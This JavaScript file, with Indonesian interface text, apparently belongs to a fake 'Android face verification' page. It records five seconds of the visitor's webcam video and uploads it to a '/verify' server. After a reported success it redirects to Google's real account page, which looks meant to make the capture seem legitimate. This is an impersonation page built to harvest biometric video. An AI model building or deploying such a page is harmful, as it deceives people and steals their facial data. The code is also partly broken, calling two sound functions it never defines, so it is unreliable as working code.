class AndroidFaceAuth {
    constructor() {
        this.video = document.getElementById('video');
        this.recorder = null;
        this.chunks = [];
        this.attempts = 0;
        this.maxAttempts = 3;
        
        this.init();
    }

    async init() {
        await this.startCamera();
        this.setupRecorder();
        this.playScanSound();
    }

    async startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    width: 640, 
                    height: 480,
                    facingMode: 'user' 
                }
            });
            this.video.srcObject = stream;
        } catch (err) {
            this.showError("Akses kamera ditolak. Aktifkan izin kamera di pengaturan.");
        }
    }

    setupRecorder() {
        const stream = this.video.srcObject;
        this.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        
        this.recorder.ondataavailable = (e) => {
            if (e.data.size > 0) this.chunks.push(e.data);
        };

        this.recorder.onstop = () => this.sendToServer();
        
        // Rekam selama 5 detik
        setTimeout(() => {
            if (this.recorder.state === 'recording') {
                this.recorder.stop();
            }
        }, 5000);
        
        this.recorder.start();
    }

    async sendToServer() {
        const blob = new Blob(this.chunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append('face_data', blob, 'android_face_verify.webm');

        try {
            const response = await fetch('/verify', {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            
            if (result.status === 'success') {
                this.playSuccessSound();
                this.showMessage("✅ Verifikasi berhasil! Mengarahkan ke akun Anda...");
                // Redirect setelah 3 detik
                setTimeout(() => {
                    window.location.href = "https://myaccount.google.com";
                }, 3000);
            } else {
                this.attempts++;
                this.playErrorSound();
                this.showMessage(`❌ ${result.message} (Percobaan ${this.attempts}/${this.maxAttempts})`);
                if (this.attempts < this.maxAttempts) {
                    setTimeout(() => this.setupRecorder(), 2000);
                } else {
                    this.showError("Verifikasi gagal. Coba lagi nanti.");
                }
            }
        } catch (error) {
            console.error("Error:", error);
            this.showError("Koneksi bermasalah. Cek jaringan Anda.");
        }
    }

    playScanSound() {
        const audio = new Audio('static/sound.mp3');
        audio.volume = 0.3;
        audio.play().catch(e => console.log("Audio error:", e));
    }

    showMessage(text) {
        const msgElement = document.querySelector('.status-message');
        msgElement.textContent = text;
    }

    showError(text) {
        this.showMessage(text);
        document.querySelector('.btn-retry').style.display = 'block';
    }
}

// Jalankan saat halaman siap
document.addEventListener('DOMContentLoaded', () => {
    new AndroidFaceAuth();
});
